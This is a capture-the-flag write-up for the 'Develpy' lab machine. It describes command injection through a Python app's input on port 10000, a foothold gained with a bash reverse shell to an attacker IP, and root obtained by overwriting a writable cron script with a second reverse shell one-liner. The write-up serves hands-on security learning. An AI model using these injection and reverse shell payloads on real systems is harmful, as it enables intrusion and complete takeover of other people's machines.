Develpy

Target IP: 10.10.17.223
Challenge Description: read user.txt and root.txt.

Reconnaissance


Performing a port scan shows there are two TCP ports open on the target machine.


Doing an aggressive port scan against the two open TCP ports returns the result above. The Python application on port 10000 seems to be interesting.

Enumeration

Port 10000: Python Application

I connected to this application via nc. The application asks for input. Sending an integer causes the application to work. In the background, I assume the application is performing a ping test. I wonder if the application is vulnerable to command injection.


And bingo! I sent the payload __import__("os").system("id"), as the input and received the output above. The id command is executed successfully and the result uid=1000(king) gid=1000(king) groups=1000(king),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare) is returned, as shown above. Time to exploit this vulnerability and gain a foothold on the target machine.

Exploitation


In the picture above, I have two terminals. The terminal on top is where I deploy the bash reverse shell payload. And the terminal on bottom is where I obtain a reverse shell connection. I started a listener on port 8443 on my machine. Then on the top terminal, I deployed the bash payload __import__("os").system("bash -c 'bash -i >& /dev/tcp/10.14.55.153/8443 0>&1'"). And on my second terminal, I obtained a reverse shell connection with the session as king. Now I have a foothold on the target machine.

Privilege Escalation


Running cat /etc/crontab shows the three interesting cronjob entries above.


I transferred Linpeas to the target machine and executed it. By the looks of it, the root.sh is run by the user root. And I have the permission to delete this file.


I deleted the root.sh via rm. Then I created the same file root.sh with the bash reverse shell script inside it using the command echo '/bin/bash -i >& /dev/tcp/10.14.55.153/8445 0>&1' > root.sh. Then I changed the permission of this file to be executable. And I started a listener on port 8445 on my machine. After a while, I gained a root reverse shell connection on port 8445 as shown above.
